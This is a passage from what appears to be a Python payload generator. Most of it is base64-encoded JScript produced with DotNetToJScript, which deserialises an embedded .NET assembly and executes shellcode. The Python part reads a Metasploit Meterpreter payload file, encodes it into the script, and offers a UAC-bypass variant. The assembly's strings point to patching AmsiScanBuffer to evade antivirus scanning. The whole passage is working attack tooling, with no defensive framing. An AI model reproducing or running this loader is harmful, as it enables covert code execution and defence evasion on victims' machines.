QjdBREFBZlFBdUFBQnIiKwoiVkFCeUFHa0Fad0JuQUdVQWNnQmxBR1FBSUFCd0FHRUFlUUJzQUc4QVlRQmtBQzRBSUFCVEFIVUFZd0JqQUdVQWN3QnpBRG9BSUFCNyIrCiJBREFBZlFBdUFDQUFRd0JvQUdVQVl3QnJBQ0FBZVFCdkFIVUFjZ0FnQUd3QWFRQnpBSFFBWlFCdUFHVUFjZ0FoQUFBQWsrdVlrVHBIIisKIkJFRzB0TE9FZWx0RGdRQUVJQUVCQ0FNZ0FBRUZJQUVCRVJFRUlBRUJEZ1FnQVFFQ0RnY0lFVUVPQ0FnUlFSRkZFa2tJQkFBQUVVRUciKwoiSUFFUlJSRkJBeUFBRFFVQUFSSlZEZ1FnQUJKZEJDQUFFV0VFQUFFQkRoOEhGZzRZQ1IwRkhRVVJGQkVRQWhFWUNRb1lIUVVkQlJnQyIrCiJHQWtKQ1JnSkJ3QUNBUkp4RVhVSUFBUUJIUVVJR0FnRkFBRWRCUTRDQmhnR0FBTU9EaHdjQXdBQUNBUUFBUW9ZQkFBQkdBb0VJQUVPIisKIkRnVUFBZzRPRGdZQUFnb2RCUWdHQUFNT0RnNE9CZ0FDQ1IwRkNBVUFBZzRPSEFZQUFSS0FtUTRJdDNwY1ZoazA0SWtFQkFBQUFBUUEiKwoiQUFBQUFnWUpBZ1lJQXdZUkhBSUdEZ0lHQmdRQUFRRUpFUUFLQWc0T0dCZ0NDUmdPRUJFVUVCRVFDd0FGQ0JnSUVCRVlDUkFKQ2dBRiIrCiJBaGdZSFFVSUVCZ0VBQUVKR0FnQUJBSVlDUWtRQ1FRQUFSZ09CUUFDR0JnT0NBRUFDQUFBQUFBQUhnRUFBUUJVQWhaWGNtRndUbTl1IisKIlJYaGpaWEIwYVc5dVZHaHliM2R6QVFnQkFBSUFBQUFBQUJRQkFBOUZlR0Z0Y0d4bFFYTnpaVzFpYkhrQUFDa0JBQ1JGZUdGdGNHeGwiKwoiSUVGemMyVnRZbXg1SUdadmNpQkViM1JPWlhSVWIwcFRZM0pwY0hRQUFBVUJBQUFBQUNRQkFCOURiM0I1Y21sbmFIUWd3cWtnU21GdCIrCiJaWE1nUm05eWMyaGhkeUF5TURFM0FBQXBBUUFrTlRZMU9UaG1NV010Tm1RNE9DMDBPVGswTFdFek9USXRZV1l6TXpkaFltVTFOemMzIisKIkFBQU1BUUFITVM0d0xqQXVNQUFBQlFFQUFRQUFCQUVBQUFBQUFBQUFBQUFBRnVsZ1lRQUFBQUFDQUFBQUhBRUFBQ3c0QUFBc0dnQUEiKwoiVWxORVV6dHVYZGdKaWNaR2xQWHZRRmVXN1pzQkFBQUFYRnd4T1RJdU1UWTRMakV6TlM0M1hIWnBjM1ZoYkhOMGRXUnBiMXhFYjNSTyIrCiJaWFJVYjBwVFkzSnBjSFJjUlhoaGJYQnNaVUZ6YzJWdFlteDVYRzlpYWx4NE5qUmNVbVZzWldGelpWeEZlR0Z0Y0d4bFFYTnpaVzFpIisKImJIa3VjR1JpQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUJJIisKIk1jQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQkFCQUFBQUFZQUFDQUFBQUFBQUFBQUFBQUFBQUFBQUFCQUFFQUFBQXciKwoiQUFDQUFBQUFBQUFBQUFBQUFBQUFBQUFCQUFBQUFBQklBQUFBV0VBQUFMQURBQUFBQUFBQUFBQUFBTEFETkFBQUFGWUFVd0JmQUZZQSIrCiJSUUJTQUZNQVNRQlBBRTRBWHdCSkFFNEFSZ0JQQUFBQUFBQzlCTy8rQUFBQkFBQUFBUUFBQUFBQUFBQUJBQUFBQUFBL0FBQUFBQUFBIisKIkFBUUFBQUFDQUFBQUFBQUFBQUFBQUFBQUFBQUFSQUFBQUFFQVZnQmhBSElBUmdCcEFHd0FaUUJKQUc0QVpnQnZBQUFBQUFBa0FBUUEiKwoiQUFCVUFISUFZUUJ1QUhNQWJBQmhBSFFBYVFCdkFHNEFBQUFBQUFBQXNBUVFBd0FBQVFCVEFIUUFjZ0JwQUc0QVp3QkdBR2tBYkFCbCIrCiJBRWtBYmdCbUFHOEFBQURzQWdBQUFRQXdBREFBTUFBd0FEQUFOQUJpQURBQUFBQmlBQ1VBQVFCREFHOEFiUUJ0QUdVQWJnQjBBSE1BIisKIkFBQkZBSGdBWVFCdEFIQUFiQUJsQUNBQVFRQnpBSE1BWlFCdEFHSUFiQUI1QUNBQVpnQnZBSElBSUFCRUFHOEFkQUJPQUdVQWRBQlUiKwoiQUc4QVNnQlRBR01BY2dCcEFIQUFkQUFBQUFBQUlnQUJBQUVBUXdCdkFHMEFjQUJoQUc0QWVRQk9BR0VBYlFCbEFBQUFBQUFBQUFBQSIrCiJTQUFRQUFFQVJnQnBBR3dBWlFCRUFHVUFjd0JqQUhJQWFRQndBSFFBYVFCdkFHNEFBQUFBQUVVQWVBQmhBRzBBY0FCc0FHVUFRUUJ6IisKIkFITUFaUUJ0QUdJQWJBQjVBQUFBTUFBSUFBRUFSZ0JwQUd3QVpRQldBR1VBY2dCekFHa0Fid0J1QUFBQUFBQXhBQzRBTUFBdUFEQUEiKwoiTGdBd0FBQUFTQUFVQUFFQVNRQnVBSFFBWlFCeUFHNEFZUUJzQUU0QVlRQnRBR1VBQUFCRkFIZ0FZUUJ0QUhBQWJBQmxBRUVBY3dCeiIrCiJBR1VBYlFCaUFHd0FlUUF1QUdRQWJBQnNBQUFBWWdBZkFBRUFUQUJsQUdjQVlRQnNBRU1BYndCd0FIa0FjZ0JwQUdjQWFBQjBBQUFBIisKIlF3QnZBSEFBZVFCeUFHa0Fad0JvQUhRQUlBQ3BBQ0FBU2dCaEFHMEFaUUJ6QUNBQVJnQnZBSElBY3dCb0FHRUFkd0FnQURJQU1BQXgiKwoiQURjQUFBQUFBQ29BQVFBQkFFd0FaUUJuQUdFQWJBQlVBSElBWVFCa0FHVUFiUUJoQUhJQWF3QnpBQUFBQUFBQUFBQUFVQUFVQUFFQSIrCiJUd0J5QUdrQVp3QnBBRzRBWVFCc0FFWUFhUUJzQUdVQWJnQmhBRzBBWlFBQUFFVUFlQUJoQUcwQWNBQnNBR1VBUVFCekFITUFaUUJ0IisKIkFHSUFiQUI1QUM0QVpBQnNBR3dBQUFCQUFCQUFBUUJRQUhJQWJ3QmtBSFVBWXdCMEFFNEFZUUJ0QUdVQUFBQUFBRVVBZUFCaEFHMEEiKwoiY0FCc0FHVUFRUUJ6QUhNQVpRQnRBR0lBYkFCNUFBQUFOQUFJQUFFQVVBQnlBRzhBWkFCMUFHTUFkQUJXQUdVQWNnQnpBR2tBYndCdSIrCiJBQUFBTVFBdUFEQUFMZ0F3QUM0QU1BQUFBRGdBQ0FBQkFFRUFjd0J6QUdVQWJRQmlBR3dBZVFBZ0FGWUFaUUJ5QUhNQWFRQnZBRzRBIisKIkFBQXhBQzRBTUFBdUFEQUFMZ0F3QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQSIrCiJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFRMEFBQUFFQUFBQUNSY0FBQUFKQmdBQUFBa1dBQUFBQmhvQUFBQW5VM2x6ZEdWdExsSmxabXhsWTNScGIyNHUiKwoiUVhOelpXMWliSGtnVEc5aFpDaENlWFJsVzEwcENBQUFBQW9MIjsKdmFyIGVudHJ5X2NsYXNzID0gJ1Rlc3RDbGFzcyc7Cgp0cnkgewogICAgc2V0dmVyc2lvbigpOwogICAgdmFyIHN0bSA9IGJhc2U2NFRvU3RyZWFtKHNlcmlhbGl6ZWRfb2JqKTsKICAgIHZhciBmbXQgPSBuZXcgQWN0aXZlWE9iamVjdCgnU3lzdGVtLlJ1bnRpbWUuU2VyaWFsaXphdGlvbi5Gb3JtYXR0ZXJzLkJpbmFyeS5CaW5hcnlGb3JtYXR0ZXInKTsKICAgIHZhciBhbCA9IG5ldyBBY3RpdmVYT2JqZWN0KCdTeXN0ZW0uQ29sbGVjdGlvbnMuQXJyYXlMaXN0Jyk7CiAgICB2YXIgbiA9IGZtdC5TdXJyb2dhdGVTZWxlY3RvcjsKICAgIHZhciBkID0gZm10LkRlc2VyaWFsaXplXzIoc3RtKTsKICAgIGFsLkFkZChuKTsKICAgIHZhciBvID0gZC5EeW5hbWljSW52b2tlKGFsLlRvQXJyYXkoKSkuQ3JlYXRlSW5zdGFuY2UoZW50cnlfY2xhc3MpOw=="
        lower = "by5nb2dvKHNjKTsKfSBjYXRjaCAoZSkgewogICAgZGVidWcoZS5tZXNzYWdlKTsKfQ=="

        msffilename = "met%s.%s" % (bitness,pformat)
        runfilename = "run.js"

        m = open(msffilename,'rb')
        msf = m.read()
        msf_b64 = base64.b64encode(msf).decode()
        data = "\n\tvar sc = \"%s\"" % msf_b64

    if uacbypass == "1":
        upper = "ZnVuY3Rpb24gc2V0dmVyc2lvbigpIHsKbmV3IEFjdGl2ZVhPYmplY3QoJ1dTY3JpcHQuU2hlbGwnKS5FbnZpcm9ubWVudCgnUHJvY2VzcycpKCdDT01QTFVTX1ZlcnNpb24nKSA9ICd2NC4wLjMwMzE5JzsKfQpmdW5jdGlvbiBkZWJ1ZyhzKSB7fQpmdW5jdGlvbiBiYXNlNjRUb1N0cmVhbShiKSB7Cgl2YXIgZW5jID0gbmV3IEFjdGl2ZVhPYmplY3QoIlN5c3RlbS5UZXh0LkFTQ0lJRW5jb2RpbmciKTsKCXZhciBsZW5ndGggPSBlbmMuR2V0Qnl0ZUNvdW50XzIoYik7Cgl2YXIgYmEgPSBlbmMuR2V0Qnl0ZXNfNChiKTsKCXZhciB0cmFuc2Zvcm0gPSBuZXcgQWN0aXZlWE9iamVjdCgiU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5Gcm9tQmFzZTY0VHJhbnNmb3JtIik7CgliYSA9IHRyYW5zZm9ybS5UcmFuc2Zvcm1GaW5hbEJsb2NrKGJhLCAwLCBsZW5ndGgpOwoJdmFyIG1zID0gbmV3IEFjdGl2ZVhPYmplY3QoIlN5c3RlbS5JTy5NZW1vcnlTdHJlYW0iKTsKCW1zLldyaXRlKGJhLCAwLCAobGVuZ3RoIC8gNCkgKiAzKTsKCW1zLlBvc2l0aW9uID0gMDsKCXJldHVybiBtczsKfQoKdmFyIHNlcmlhbGl6ZWRfb2JqID0gIkFBRUFBQUQvLy8vL0FRQUFBQUFBQUFBRUFRQUFBQ0pUZVhOMFpXMHVSR1ZzWldkaGRHVlRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnkiKwoiQXdBQUFBaEVaV3hsWjJGMFpRZDBZWEpuWlhRd0IyMWxkR2h2WkRBREF3TXdVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaCIrCiJkR2x2YmtodmJHUmxjaXRFWld4bFoyRjBaVVZ1ZEhKNUlsTjVjM1JsYlM1RVpXeGxaMkYwWlZObGNtbGhiR2w2WVhScGIyNUliMnhrIisKIlpYSXZVM2x6ZEdWdExsSmxabXhsWTNScGIyNHVUV1Z0WW1WeVNXNW1iMU5sY21saGJHbDZZWFJwYjI1SWIyeGtaWElKQWdBQUFBa0QiKwoiQUFBQUNRUUFBQUFFQWdBQUFEQlRlWE4wWlcwdVJHVnNaV2RoZEdWVFpYSnBZV3hwZW1GMGFXOXVTRzlzWkdWeUswUmxiR1ZuWVhSbCIrCiJSVzUwY25rSEFBQUFCSFI1Y0dVSVlYTnpaVzFpYkhrR2RHRnlaMlYwRW5SaGNtZGxkRlI1Y0dWQmMzTmxiV0pzZVE1MFlYSm5aWFJVIisKImVYQmxUbUZ0WlFwdFpYUm9iMlJPWVcxbERXUmxiR1ZuWVhSbFJXNTBjbmtCQVFJQkFRRURNRk41YzNSbGJTNUVaV3hsWjJGMFpWTmwiKwoiY21saGJHbDZZWFJwYjI1SWIyeGtaWElyUkdWc1pXZGhkR1ZGYm5SeWVRWUZBQUFBTDFONWMzUmxiUzVTZFc1MGFXMWxMbEpsYlc5MCIrCiJhVzVuTGsxbGMzTmhaMmx1Wnk1SVpXRmtaWEpJWVc1a2JHVnlCZ1lBQUFCTGJYTmpiM0pzYVdJc0lGWmxjbk5wYjI0OU1pNHdMakF1IisKIk1Dd2dRM1ZzZEhWeVpUMXVaWFYwY21Gc0xDQlFkV0pzYVdOTFpYbFViMnRsYmoxaU56ZGhOV00xTmpFNU16UmxNRGc1QmdjQUFBQUgiKwoiZEdGeVoyVjBNQWtHQUFBQUJna0FBQUFQVTNsemRHVnRMa1JsYkdWbllYUmxCZ29BQUFBTlJIbHVZVzFwWTBsdWRtOXJaUW9FQXdBQSIrCiJBQ0pUZVhOMFpXMHVSR1ZzWldkaGRHVlRaWEpwWVd4cGVtRjBhVzl1U0c5c1pHVnlBd0FBQUFoRVpXeGxaMkYwWlFkMFlYSm5aWFF3IisKIkIyMWxkR2h2WkRBREJ3TXdVM2x6ZEdWdExrUmxiR1ZuWVhSbFUyVnlhV0ZzYVhwaGRHbHZia2h2YkdSbGNpdEVaV3hsWjJGMFpVVnUiKwoiZEhKNUFpOVRlWE4wWlcwdVVtVm1iR1ZqZEdsdmJpNU5aVzFpWlhKSmJtWnZVMlZ5YVdGc2FYcGhkR2x2YmtodmJHUmxjZ2tMQUFBQSIrCiJDUXdBQUFBSkRRQUFBQVFFQUFBQUwxTjVjM1JsYlM1U1pXWnNaV04wYVc5dUxrMWxiV0psY2tsdVptOVRaWEpwWVd4cGVtRjBhVzl1IisKIlNHOXNaR1Z5QmdBQUFBUk9ZVzFsREVGemMyVnRZbXg1VG1GdFpRbERiR0Z6YzA1aGJXVUpVMmxuYm1GMGRYSmxDazFsYldKbGNsUjUiKwoiY0dVUVIyVnVaWEpwWTBGeVozVnRaVzUwY3dFQkFRRUFBd2dOVTNsemRHVnRMbFI1Y0dWYlhRa0tBQUFBQ1FZQUFBQUpDUUFBQUFZUiIrCiJBQUFBTEZONWMzUmxiUzVQWW1wbFkzUWdSSGx1WVcxcFkwbHVkbTlyWlNoVGVYTjBaVzB1VDJKcVpXTjBXMTBwQ0FBQUFBb0JDd0FBIisKIkFBSUFBQUFHRWdBQUFDQlRlWE4wWlcwdVdHMXNMbE5qYUdWdFlTNVliV3hXWVd4MVpVZGxkSFJsY2dZVEFBQUFUVk41YzNSbGJTNVkiKwoiYld3c0lGWmxjbk5wYjI0OU1pNHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajFpTnpkaCIrCiJOV00xTmpFNU16UmxNRGc1QmhRQUFBQUhkR0Z5WjJWME1Ba0dBQUFBQmhZQUFBQWFVM2x6ZEdWdExsSmxabXhsWTNScGIyNHVRWE56IisKIlpXMWliSGtHRndBQUFBUk1iMkZrQ2c4TUFBQUFBQm9BQUFKTldwQUFBd0FBQUFRQUFBRC8vd0FBdUFBQUFBQUFBQUJBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFDQUFBQUFEaCs2RGdDMENjMGh1QUZNelNGVWFHbHpJSEJ5YjJkeSIrCiJZVzBnWTJGdWJtOTBJR0psSUhKMWJpQnBiaUJFVDFNZ2JXOWtaUzRORFFva0FBQUFBQUFBQUZCRkFBQmtoZ0lBTUVYMllBQUFBQUFBIisKIkFBQUE4QUFpSUFzQ01BQUFFZ0FBQUFZQUFBQUFBQUFBQUFBQUFDQUFBQUFBQUlBQkFBQUFBQ0FBQUFBQ0FBQUVBQUFBQUFBQUFBUUEiKwoiQUFBQUFBQUFBR0FBQUFBQ0FBQUFBQUFBQXdCQWhRQUFRQUFBQUFBQUFFQUFBQUFBQUFBQUFCQUFBQUFBQUFBZ0FBQUFBQUFBQUFBQSIrCiJBQkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUVBQUFBd0VBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQWtNQUFBIisKIkhBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFDQUFBRWdBQUFBQUFBQUFBQUFBQUM1MFpYaDBBQUFBWkJFQUFBQWdBQUFBRWdBQUFBSUFBQUFBQUFBQUFBQUFBQUFBQUNBQSIrCiJBR0F1Y25OeVl3QUFBQXdFQUFBQVFBQUFBQVlBQUFBVUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFCQUFBQUFBQUFBQUFBQUFBQUFBQUFBIisKIkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUVnQUFBQUNBQVVBV0NFQUFNd09BQUFCQUFBQUFBQUFBQUFBQUFBQUFBQUEiKwoiQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCTXdCUUQ0QUFBQUFRQUFFUUlvRHdBQSIrCiJDbklCQUFCd2NoTUFBSEFLS0FJQUFBWUdLQU1BQUFZTEZnd1pqUklBQUFFbDBBRUFBQVFvRUFBQUNnMEhHUjlBRWdJb0JBQUFCaVlKIisKIkZnY0pqbWtvRVFBQUNnY1pIeUFTQWlnRUFBQUdKbkl4QUFCd0tCSUFBQW9UQkNnVEFBQUtFUVJ2RkFBQUNoTUZmaFVBQUFweVBBTUEiKwoiY0JkdkZnQUFDaVZ5WUFNQWNHOFhBQUFLSm40VkFBQUtjcDREQUhBWGJ4WUFBQW9sY3Y0REFIQnlIZ1FBY0c4WUFBQUtKWEllQkFCdyIrCiJFUVZ2R0FBQUNtOFpBQUFLY3hvQUFBb2xieHNBQUFvWGJ4d0FBQW9sYnhzQUFBcHlJQVFBY0c4ZEFBQUtieDRBQUFvbUlCQW5BQUFvIisKIkh3QUFDbkprQkFCd2J5QUFBQW9xSWdNb0lRQUFDaVlxQUFBQVFsTktRZ0VBQVFBQUFBQUFEQUFBQUhZeUxqQXVOVEEzTWpjQUFBQUEiKwoiQlFCc0FBQUFpQU1BQUNOK0FBRDBBd0FBekFRQUFDTlRkSEpwYm1kekFBQUFBTUFJQUFCOEJBQUFJMVZUQUR3TkFBQVFBQUFBSTBkViIrCiJTVVFBQUFCTURRQUFnQUVBQUNOQ2JHOWlBQUFBQUFBQUFBSUFBQUZYbFFJMENRSUFBQUQ2QVRNQUZnQUFBUUFBQUI0QUFBQUVBQUFBIisKIkFRQUFBQVlBQUFBTUFBQUFJUUFBQUE4QUFBQUJBQUFBQVFBQUFBSUFBQUFFQUFBQUFRQUFBQUVBQUFBQ0FBQUFBUUFBQUFBQUFBTUIiKwoiQUFBQUFBQUdBQk1DbmdNR0FJQUNuZ01HQUdBQmJBTVBBTDREQUFBR0FJZ0JHd01HQVBZQkd3TUdBTmNCR3dNR0FHY0NHd01HQURNQyIrCiJHd01HQUV3Q0d3TUdBSjhCR3dNR0FIUUJmd01HQUZJQmZ3TUdBTG9CR3dNR0FCSUVGQU1HQURjQm5nTUdBQ2NCRkFNR0FKNENGQU1HIisKIkFOVURuZ01HQUhnRUZBTUdBTTRBRkFNR0FPMENmd01HQUVvRUZBTUdBTVFDVWdRR0FNTUVDZ0FHQUpZRUNnQUtBUEVEYkFNS0FFTUQiKwoiYkFNS0FQa0FiQU1HQUxFQXN3SUFBQUFBZ0FBQUFBQUFBUUFCQUFFQUVBRGtBd0FBUFFBQkFBRUFBQUVBQUlrQUFBQTlBQUVBQndBVCIrCiJBUUFBR2dBQUFFVUFBZ0FIQURNQk5nQ0JBQUFBQUFDQUFKWWdZd1NGQUFFQUFBQUFBSUFBbGlDM0JJMEFCUUFBQUFBQWdBQ1dJUGtEIisKImtnQUdBQUFBQUFDQUFKWWdLQVNZQUFnQVNDQUFBQUFBaGhobUF3WUFEQUJNSVFBQUFBQ0dBTzRERUFBTUFBQUFBUUM0QUFBQUFnQmUiKwoiQkFBQUF3QXRBd0FBQkFETkF3QUFBUUFpQVFBQUFRRGhBQUFBQWdBTUFRQUFBUUFJQkFBQUFnQ3NBZ0FBQXdBM0JBSUFCQUFaQkFBQSIrCiJBUURvQWdrQVpnTUJBQkVBWmdNR0FCa0FaZ01LQUNrQVpnTVFBREVBWmdNUUFEa0FaZ01RQUVFQVpnTVFBRWtBWmdNUUFGRUFaZ01RIisKIkFGa0FaZ01RQUdFQVpnTVZBR2tBWmdNUUFIRUFaZ01RQUlFQVpnTUdBSGtBWmdNR0FKa0FiZ1FsQUxFQXNnUXRBTGtBelFJMkFNRUEiKwoiZHdBOEFNRUEzZ0pCQU1rQVdnTkhBTkVBaXdSTEFORUFmZ1JTQU5FQW93SllBTkVBTVFFR0FOa0FaZ01HQU5rQU5RTmVBT0VBNlFCaiIrCiJBT0VBRlFFUUFOa0FSQVJwQVBFQVZBTnRBTkVBdlFBUUFOa0FSQVJ5QUM0QUN3Q2hBQzRBRXdDcUFDNEFHd0RKQUM0QUl3RFNBQzRBIisKIkt3RG5BQzRBTXdBUkFTNEFPd0FSQVM0QVF3RFNBQzRBU3dBWEFTNEFVd0FSQVM0QVd3QVJBUzRBWXdBOEFTNEFhd0JtQVVNQVd3QnoiKwoiQVdNQWN3QjVBUUVBQXdBQUFBUUFHZ0QxQWdFQVJnRURBR01FQVFBQUFRVUF0d1FDQUFBQkJ3RDVBd0lBQUFFSkFDZ0VBZ0JjTVFBQSIrCiJBUUFFZ0FBQUFRQUFBQUFBQUFBQUFBQUFBQUNpQkFBQUFnQUFBQUFBQUFBQUFBQUFlQUNvQUFBQUFBQUNBQUFBQUFBQUFBQUFBQUI0IisKIkFCUURBQUFBQUFRQUF3QUFBQUJyWlhKdVpXd3pNZ0JOYVdOeWIzTnZablF1VjJsdU16SUFYMTlUZEdGMGFXTkJjbkpoZVVsdWFYUlUiKwoiZVhCbFUybDZaVDB6QUVRek16UTVNamhGT1VRME1UWXlPVUkyUkRkRFFUaERSRUpHTmpSQ01UaEVOemxFUmtRMFJUTTJPVGd3UkVNdyIrCiJRMEV3TkRrMU16VXhPRFkwTkRkR01UY0FaMlYwWDFWVVJqZ0FQRTF2WkhWc1pUNEFQRkJ5YVhaaGRHVkpiWEJzWlcxbGJuUmhkR2x2IisKImJrUmxkR0ZwYkhNK0FHMXpZMjl5YkdsaUFGUm9jbVZoWkFCb1YyNWtBRVJsYkdWMFpWTjFZa3RsZVZSeVpXVUFVblZ1ZEdsdFpVWnAiKwoiWld4a1NHRnVaR3hsQUdoTmIyUjFiR1VBYzJWMFgxZHBibVJ2ZDFOMGVXeGxBRkJ5YjJObGMzTlhhVzVrYjNkVGRIbHNaUUJ3Y205aiIrCiJUbUZ0WlFCelpYUmZSbWxzWlU1aGJXVUFibUZ0WlFCV1lXeDFaVlI1Y0dVQVEyeHZjMlVBUTI5dGNHbHNaWEpIWlc1bGNtRjBaV1JCIisKImRIUnlhV0oxZEdVQVIzVnBaRUYwZEhKcFluVjBaUUJFWldKMVoyZGhZbXhsUVhSMGNtbGlkWFJsQUVOdmJWWnBjMmxpYkdWQmRIUnkiKwoiYVdKMWRHVUFRWE56WlcxaWJIbFVhWFJzWlVGMGRISnBZblYwWlFCQmMzTmxiV0pzZVZSeVlXUmxiV0Z5YTBGMGRISnBZblYwWlFCQiIrCiJjM05sYldKc2VVWnBiR1ZXWlhKemFXOXVRWFIwY21saWRYUmxBRUZ6YzJWdFlteDVRMjl1Wm1sbmRYSmhkR2x2YmtGMGRISnBZblYwIisKIlpRQkJjM05sYldKc2VVUmxjMk55YVhCMGFXOXVRWFIwY21saWRYUmxBRU52YlhCcGJHRjBhVzl1VW1Wc1lYaGhkR2x2Ym5OQmRIUnkiKwoiYVdKMWRHVUFRWE56WlcxaWJIbFFjbTlrZFdOMFFYUjBjbWxpZFhSbEFFRnpjMlZ0WW14NVEyOXdlWEpwWjJoMFFYUjBjbWxpZFhSbCIrCiJBRUZ6YzJWdFlteDVRMjl0Y0dGdWVVRjBkSEpwWW5WMFpRQlNkVzUwYVcxbFEyOXRjR0YwYVdKcGJHbDBlVUYwZEhKcFluVjBaUUJDIisKImVYUmxBRk5sZEZaaGJIVmxBR1IzVTJsNlpRQlRlWE4wWlcwdVZHaHlaV0ZrYVc1bkFFVnVZMjlrYVc1bkFFWnliMjFDWVhObE5qUlQiKwoiZEhKcGJtY0FSMlYwVTNSeWFXNW5BSEJoZEdnQVRXRnljMmhoYkFCMWMyVnlNekl1Wkd4c0FFVjRZVzF3YkdWQmMzTmxiV0pzZVM1ayIrCiJiR3dBVTNsemRHVnRBRk41YzNSbGJTNVNaV1pzWldOMGFXOXVBR05oY0hScGIyNEFaMlYwWDFOMFlYSjBTVzVtYndCUWNtOWpaWE56IisKIlUzUmhjblJKYm1adkFGTnNaV1Z3QUVOMWNuSmxiblJWYzJWeUFDNWpkRzl5QUZONWMzUmxiUzVFYVdGbmJtOXpkR2xqY3dCVGVYTjAiKwoiWlcwdVVuVnVkR2x0WlM1SmJuUmxjbTl3VTJWeWRtbGpaWE1BVTNsemRHVnRMbEoxYm5ScGJXVXVRMjl0Y0dsc1pYSlRaWEoyYVdObCIrCiJjd0JFWldKMVoyZHBibWROYjJSbGN3QnZjSFJwYjI1ekFGSjFiblJwYldWSVpXeHdaWEp6QUZSbGMzUkRiR0Z6Y3dCU2RXNVFjbTlqIisKIlpYTnpBRWRsZEZCeWIyTkJaR1J5WlhOekFHeHdRV1JrY21WemN3QlBZbXBsWTNRQWJIQm1iRTlzWkZCeWIzUmxZM1FBVm1seWRIVmgiKwoiYkZCeWIzUmxZM1FBWm14T1pYZFFjbTkwWldOMEFGTjBZWEowQUVOdmJuWmxjblFBVTNsemRHVnRMbFJsZUhRQWRHVjRkQUJOWlhOeiIrCiJZV2RsUW05NEFFbHVhWFJwWVd4cGVtVkJjbkpoZVFCRGNtVmhkR1ZUZFdKTFpYa0FUM0JsYmxOMVlrdGxlUUJTWldkcGMzUnllVXRsIisKImVRQkZlR0Z0Y0d4bFFYTnpaVzFpYkhrQVEyOXdlUUJNYjJGa1RHbGljbUZ5ZVFCU1pXZHBjM1J5ZVFBQUVXRUFiUUJ6QUdrQUxnQmsiKwoiQUd3QWJBQUFIVUVBYlFCekFHa0FVd0JqQUdFQWJnQkNBSFVBWmdCbUFHVUFjZ0FBZ3dsakFHNEFWZ0IxQUZvQVJ3QjRBSE1BVFFCNiIrCiJBRWtBWndCVkFEQUFhQUJHQUZRQVJRQjNBSG9BVFFCcEFEVUFSUUJVQUVVQWR3QnpBRlVBTWdCb0FHd0FZZ0JIQUhnQVJnQmxBRWNBIisKIlZnQnFBRmdBTVFCS0FERUFZZ0JyQUZJQVRRQlVBRU1BUVFCcEFGa0FNZ0F4QUdzQVNRQnBBRUVBYVFCTUFESUFUUUJuQ